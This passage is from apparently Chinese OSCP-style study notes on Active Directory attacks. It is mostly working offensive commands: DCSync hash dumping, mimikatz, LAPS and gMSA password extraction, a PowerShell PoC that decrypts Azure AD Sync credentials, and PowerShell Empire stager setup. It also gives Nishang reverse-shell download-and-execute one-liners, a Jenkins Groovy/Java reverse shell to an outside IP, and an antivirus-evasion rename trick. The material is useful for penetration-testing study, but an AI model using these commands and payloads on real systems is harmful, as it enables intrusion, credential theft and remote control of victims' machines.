</code></pre><h2 id=几个横向工具>几个横向工具<a hidden class=anchor aria-hidden=true href=#几个横向工具>#</a></h2><h4 id=1psexec>1、psexec<a hidden class=anchor aria-hidden=true href=#1psexec>#</a></h4><p>通过创建服务和上传二进制程序getshell，日志记录明显，且容易被杀。</p><p>条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）</p><h4 id=2smbexec>2、smbexec<a hidden class=anchor aria-hidden=true href=#2smbexec>#</a></h4><p>通过创建服务和bat的形式执行命令，通过读取txt来获取回显，日志更为明显，defender拦截。</p><p>条件：445端口，IPC$开启，非IPC$开启（这几个条件默认满足）</p><h4 id=3wmiexec>3、wmiexec<a hidden class=anchor aria-hidden=true href=#3wmiexec>#</a></h4><p>通过wmi来实现命令执行，躲避杀软效果较好，445获取回显</p><p>条件：135、445端口，admin$开启（默认满足）</p><h4 id=4atexec>4、atexec<a hidden class=anchor aria-hidden=true href=#4atexec>#</a></h4><p>通过计划任务实现At exec的主要特点是通过135端口进行计划任务的创建，同时通过445端口进行SMB认证</p><p>条件：135、445（默认满足）</p><h4 id=5dcomexec>5、dcomexec<a hidden class=anchor aria-hidden=true href=#5dcomexec>#</a></h4><p>通过dcom在目标执行命令</p><p>条件：135、445</p><h2 id=bloodhound>Bloodhound<a hidden class=anchor aria-hidden=true href=#bloodhound>#</a></h2><pre tabindex=0><code>Import-Module ./SharpHound.ps1
Invoke-BloodHound -c all


如果遇到无法上传，尝试使用1.1版本，甚至更低的1.0.3
https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.1/SharpHound-v1.1.1.zip
</code></pre><h4 id=bloodhoundpy>bloodhound.py<a hidden class=anchor aria-hidden=true href=#bloodhoundpy>#</a></h4><pre tabindex=0><code>https://github.com/dirkjanm/BloodHound.py

python3 bloodhound.py -d 域名 -u 用户 -p 密码 -ns 域控IP -dc 域控主机名 -c all --zip
</code></pre><h4 id=bloodhoundpy-kerberos>bloodhound.py-kerberos<a hidden class=anchor aria-hidden=true href=#bloodhoundpy-kerberos>#</a></h4><pre tabindex=0><code>git clone https://github.com/jazzpizazz/BloodHound.py-Kerberos

sudo ntpdate -s 10.10.11.181

python3 ../impacket/examples/getTGT.py absolute.htb/m.lovegod:&#39;AbsoluteLDAP2022!&#39; -dc-ip 10.10.11.181

export KRB5CCNAME=./m.lovegod.ccache

python3 BloodHound.py-Kerberos/bloodhound.py -u m.lovegod -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 --dns-tcp --zip -c All -no-pass
</code></pre><h2 id=impacket工具包>Impacket工具包：<a hidden class=anchor aria-hidden=true href=#impacket工具包>#</a></h2><pre tabindex=0><code>dacl的连接：
https://github.com/ShutdownRepo/impacket/tree/dacledit

域外添加账户权限，kerberos情况下：

同步时间：
sudo ntpdate -s 10.10.11.181
申请票据：
python3 impacket-dacledit/examples/getTGT.py absolute.htb/m.lovegod:&#39;AbsoluteLDAP2022!&#39; -dc-ip 10.10.11.181
添加环境变量：
export KRB5CCNAME=m.lovegod.ccache
使用：

python3 impacket-dacledit/examples/dacledit.py -action &#39;write&#39; -rights &#39;WriteMembers&#39; -principal &#39;m.lovegod&#39; -target-dn &#39;CN=NETWORK AUDIT,CN=USERS,DC=ABSOLUTE,DC=HTB&#39; -k -no-pass -u absolute.htb/m.lovegod -dc-ip 10.10.11.181
Impacket v0.12.0.dev1+20240116.639.82267d84 - Copyright 2021 SecureAuth Corporation


域外添加DCSYNC权限：
python dacledit.py -action &#39;write&#39; -rights &#39;FullControl&#39; -principal &#39;cxk&#39; -target-dn &#39;DC=HTB,DC=LOCAL&#39; &#39;HTB.LOCAL&#39;/&#39;cxk&#39;:&#39;cxk123!&#39; -dc-ip 10.10.10.161

DCSYNC获取hash:
python secretsdump.py HTB.LOCAL/cxk:&#39;cxk123!&#39;@10.10.10.161
</code></pre><h2 id=mimikatz>mimikatz<a hidden class=anchor aria-hidden=true href=#mimikatz>#</a></h2><pre tabindex=0><code>非交互式运行：
mimikatz.exe dpapi::firefox
mimikatz.exe lsadump::dcsync /domain:scrm.local /all /csv
</code></pre><h2 id=主机密码获取>主机密码获取<a hidden class=anchor aria-hidden=true href=#主机密码获取>#</a></h2><pre tabindex=0><code>浏览器等：
https://github.com/AlessandroZ/LaZagne
</code></pre><h3 id=readlapspassword>ReadLAPSPassword<a hidden class=anchor aria-hidden=true href=#readlapspassword>#</a></h3><pre tabindex=0><code>https://github.com/p0dalirius/pyLAPS
查询密码：
python pyLAPS.py --action get -u &#39;JDgodd&#39; -d &#39;streamio.htb&#39; -p &#39;JDg0dd1s@d0p3cr3@t0r&#39; --dc-ip 10.10.11.158
</code></pre><h3 id=writeowner-权限>writeowner 权限：<a hidden class=anchor aria-hidden=true href=#writeowner-权限>#</a></h3><pre tabindex=0><code>修改用户所有者：

python owneredit.py -action write -new-owner &#39;JDgodd&#39; -target &#39;CORE STAFF&#39; &#39;STREAMIO.HTB&#39;/&#39;JDgodd&#39;:&#39;JDg0dd1s@d0p3cr3@t0r&#39;

修改DACL权限：
具体情况具体分析，主要是看这个组有什么权限,最好是完全控制权限：FullControl
授予JDgodd向CORE STAFF组添加用户的权限：
dacledit.py -action &#39;write&#39; -rights &#39;WriteMembers&#39; -principal &#39;JDgodd&#39; -target-dn &#39;CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB&#39; &#39;STREAMIO.HTB&#39;/&#39;JDgodd&#39;:&#39;JDg0dd1s@d0p3cr3@t0r&#39;

把自己添加到CORE STAFF组内：

net rpc group addmem &#34;CORE STAFF&#34; &#34;JDgodd&#34; -U &#34;STREAMIO.HTB&#34;/&#34;JDgodd&#34;%&#34;JDg0dd1s@d0p3cr3@t0r&#34; -S &#34;dc.STREAMIO.HTB&#34;
</code></pre><h2 id=ad-recycle-bin组>AD Recycle Bin组<a hidden class=anchor aria-hidden=true href=#ad-recycle-bin组>#</a></h2><pre tabindex=0><code>查看已经删除了的用户：
Get-ADObject -filter &#39;isDeleted -eq $true -and name -ne &#34;Deleted Objects&#34;&#39; -includeDeletedObjects
获取该用户的详细信息：
Get-ADObject -filter { SAMAccountName -eq &#34;TempAdmin&#34; } -includeDeletedObjects -property *
</code></pre><h2 id=添加dns记录>添加dns记录<a hidden class=anchor aria-hidden=true href=#添加dns记录>#</a></h2><pre tabindex=0><code>https://github.com/4ndr34z/krbrelayx.git

添加主机dns记录：
python dnstool.py -u &#39;intelligence\Tiffany.Molina&#39; -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.18 -t A
</code></pre><h2 id=readgmsapassword权限>ReadGMSAPassword权限<a hidden class=anchor aria-hidden=true href=#readgmsapassword权限>#</a></h2><pre tabindex=0><code>python gMSADumper.py -u &#39;Ted.Graves&#39; -p &#39;Mr.Teddy&#39; -d &#39;intelligence.htb&#39;
</code></pre><h2 id=readlapspassword-1>ReadLAPSPassword<a hidden class=anchor aria-hidden=true href=#readlapspassword-1>#</a></h2><pre tabindex=0><code>https://github.com/p0dalirius/pyLAPS
python pyLAPS.py --action get -d &#34;hutch.offsec&#34; -u &#34;fmcSorley&#34; -p &#34;CrabSharkJellyfish192&#34; --dc-ip 192.168.224.122

默认获取为administrator密码
</code></pre><h2 id=azure-ad-aad-sync-service攻击>Azure AD (AAD) Sync service攻击<a hidden class=anchor aria-hidden=true href=#azure-ad-aad-sync-service攻击>#</a></h2><pre tabindex=0><code>查询注册表，服务路径：
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync

通过路径确定版本：
Get-ItemProperty -Path &#34;C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe&#34;|Format-list -Property * -Force

从数据库中提取信息：
sqlcmd -S MONTEVERDE -Q &#34;use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration&#34;

poc:
Function Get-ADConnectPassword{
Write-Host &#34;AD Connect Sync Credential Extract POC (@_xpn_)`n&#34;
$key_id = 1
$instance_id = [GUID]&#34;1852B527-DD4F-4ECF-B541-EFCCBFF29E31&#34;(修改)
$entropy = [GUID]&#34;194EC2FC-F186-46CF-B44D-071EB61F49CD&#34;（修改）
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &#34;Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true&#34;
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = &#34;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&#34;
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()
add-type -path &#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#39;
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
$domain = select-xml -Content $config -XPath &#34;//parameter[@name=&#39;forest-login-domain&#39;]&#34; | select @{Name = &#39;Domain&#39;; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath &#34;//parameter[@name=&#39;forest-login-user&#39;]&#34; | select @{Name = &#39;Username&#39;; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath &#34;//attribute&#34; | select @{Name =&#39;Password&#39;; Expression = {$_.node.InnerXML}}
Write-Host (&#34;Domain: &#34; + $domain.Domain)
Write-Host (&#34;Username: &#34; + $username.Username)
Write-Host (&#34;Password: &#34; + $password.Password)
}
</code></pre><h2 id=powerview脚本>powerview脚本<a hidden class=anchor aria-hidden=true href=#powerview脚本>#</a></h2><pre tabindex=0><code>下载：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

bypass

powershell -ep bypass

导入：
. .\PowerView.ps1

修改账户密码：
$UserPassword = ConvertTo-SecureString &#39;Password123!&#39; -AsPlainText -Force
Set-DomainUserPassword -Identity SMITH（用户名）-AccountPassword $UserPassword -Credential $Cred



常规用法：
查看域内信息：
Get-NetDomain

查看用户信息：
Get-NetUser
Get-NetUser | select cn

查看组：
Get-NetGroup | select cn

查看组成员
Get-NetGroup &#34;Sales Department&#34; | select member

查看主机信息：
Get-NetComputer

！！！！！！！！！！！
查看当前用户可以以管理员登录哪台计算机：
Find-LocalAdminAccess

查看目标计算机登录的用户：
Get-NetSession -ComputerName files04 -Verbose

枚举域共享：
Find-DomainShare
</code></pre><h2 id=票据常规操作>票据常规操作<a hidden class=anchor aria-hidden=true href=#票据常规操作>#</a></h2><pre tabindex=0><code>摧毁票据：
kdestroy

导入票据：
export KRB5CCNAME=administrator.ccache
</code></pre><h1 id=net-rpc>net rpc<a hidden class=anchor aria-hidden=true href=#net-rpc>#</a></h1><pre tabindex=0><code>kerberos协议添加用户进组：

net rpc group addmem &#34;NETWORK AUDIT&#34; &#34;m.lovegod&#34; -U &#34;absolute.htb&#34;/&#34;m.lovegod&#34; -S &#34;DC.absolute.htb&#34; --use-kerberos=required

修改密码，以hash的方式 
net rpc password &#34;Tristan.Davies&#34; &#34;newP@ssword2023&#34; -U &#34;search.htb&#34;/&#34;BIR-ADFS-GMSA$&#34;  -S &#34;RESEARCH.search.htb&#34; --pw-nt-hash
</code></pre><h1 id=nishang>Nishang<a hidden class=anchor aria-hidden=true href=#nishang>#</a></h1><p>一个涵盖几乎所有渗透测试流程的脚本：</p><pre tabindex=0><code>https://github.com/samratashok/nishang/tree/master
</code></pre><p>一个简单介绍：
有点骚东西：
<a href=https://www.bilibili.com/read/cv19365761/>https://www.bilibili.com/read/cv19365761/</a></p><p>反弹shell：</p><pre tabindex=0><code>下载https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

在最后面，添加：
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444

开启http服务：
远程调用执行：
1、powershell.exe -c &#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.223:8000/nishang.ps1&#39;)&#34;

2、powershell iex(new-object net.webclient).downloadstring(\&#34;http://10.10.16.5/Invoke-PowerShellTcp.ps1\&#34;)

3、IEX (New-Object System.Net.Webclient).DownloadString(&#34;http://192.168.119.3/powercat.ps1&#34;);powercat -c 192.168.119.3 -p 4444 -e powershell


躲避检测：
修改文件名字为tcp.ps1
sed -i &#34;s/PowerShellTcp/tcpps/g&#34; tcp.ps1

Jenkins:

windows:
def proc = &#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.16.3/nishang.ps1&#39;)&#34;.execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());

Linux：
String host=&#34;83.229.122.49&#34;;
int port=8888;
String cmd=&#34;/bin/sh&#34;;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
</code></pre><p>正向shell：</p><pre tabindex=0><code>和上一步的却别在于，修改最后一行为：
Invoke-PowerShellTcp -Bind -Port 1521

然后正向去连接：
nc -nv 10.10.10.125 1521 
</code></pre><h1 id=powershell-empire>PowerShell Empire<a hidden class=anchor aria-hidden=true href=#powershell-empire>#</a></h1><p>该工具作为msf禁用情况下的代替工具，核心还是代替EXE，存疑，建议别用</p><pre tabindex=0><code>开启服务：
sudo powershell-empire server

启动客户端：
sudo powershell-empire client


进入监听：
listeners
uselistener http

使用options查看设置详情：

设置监听详情：
set Name yesir
set Host 10.10.16.5
set Port 1336
execute

输入help查看帮助：

生成木马：
usestager windows_reverseshell
set Listener yesir
set LocalHost 10.10.16.5
set LocalPort 1336
execute

查看会话：
agents

进入会话：
interact 会话名

退出会话：
back
</code></pre><h3 id=targetedkerberoast>targetedKerberoast<a hidden class=anchor aria-hidden=true href=#targetedkerberoast>#</a></h3><pre tabindex=0><code>https://github.com/ShutdownRepo/targetedKerberoast
</code></pre><h1 id=crackmapexec>CrackMapExec<a hidden class=anchor aria-hidden=true href=#crackmapexec>#</a></h1><p>该工具的使用极为强大：
简介：
<a href=https://mp.weixin.qq.com/s/G1PC_C3fhE-OGIbnBFRNQQ>https://mp.weixin.qq.com/s/G1PC_C3fhE-OGIbnBFRNQQ</a></p><p>github:
<a href=https://github.com/byt3bl33d3r/CrackMapExec>https://github.com/byt3bl33d3r/CrackMapExec</a></p><pre tabindex=0><code>smb 192.168.216.144 -u &#39;administrator&#39; -p &#39;pass1234!&#39; -x &#39;whoami&#39;
</code></pre><p>持续爆破</p><pre tabindex=0><code>--continue-on-success
</code></pre><p>目前我感兴趣的地方：</p><pre tabindex=0><code>1、smb 枚举东西较多，如共享、杀软、域用户、密码策略、验证登录
2、dump hash，有高权限账号的话
3、导出ntds域内数据库
4、通过smb文件上传、下载
5、枚举打印机、webdav服务等
6、AS-REP Roast，在有用户名的前提下还可以再次枚举
7、ESC8 查找
8、ms17-010、zerologo（CVE-2020-1472）、petitpotam、nopac（CVE-2021-42278 and CVE-2021-42287）漏洞
</code></pre><h1 id=域内权限的利用特点记录>域内权限的利用特点记录：<a hidden class=anchor aria-hidden=true href=#域内权限的利用特点记录>#</a></h1><pre tabindex=0><code>owns权限记得先修改所属人，在进行下一步
</code></pre><h1 id=影子凭证>影子凭证<a hidden class=anchor aria-hidden=true href=#影子凭证>#</a></h1><h1 id=certipy工具>Certipy工具<a hidden class=anchor aria-hidden=true href=#certipy工具>#</a></h1><pre tabindex=0><code>
github.com/ly4k/Certipy

使用方式：
https://cloud.tencent.com/developer/article/1946138
</code></pre><h1 id=psloggedon-工具>PsLoggedon 工具<a hidden class=anchor aria-hidden=true href=#psloggedon-工具>#</a></h1><pre tabindex=0><code>查看主机登录账户：
.\PsLoggedon.exe \\web04
</code></pre></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/><span class=title>« Prev</span><br><span>域渗透思路总结</span>
</a><a class=next href=https://yangzhuzai.github.io/posts/oscp/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB/><span class=title>Next »</span><br><span>客户端攻击</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>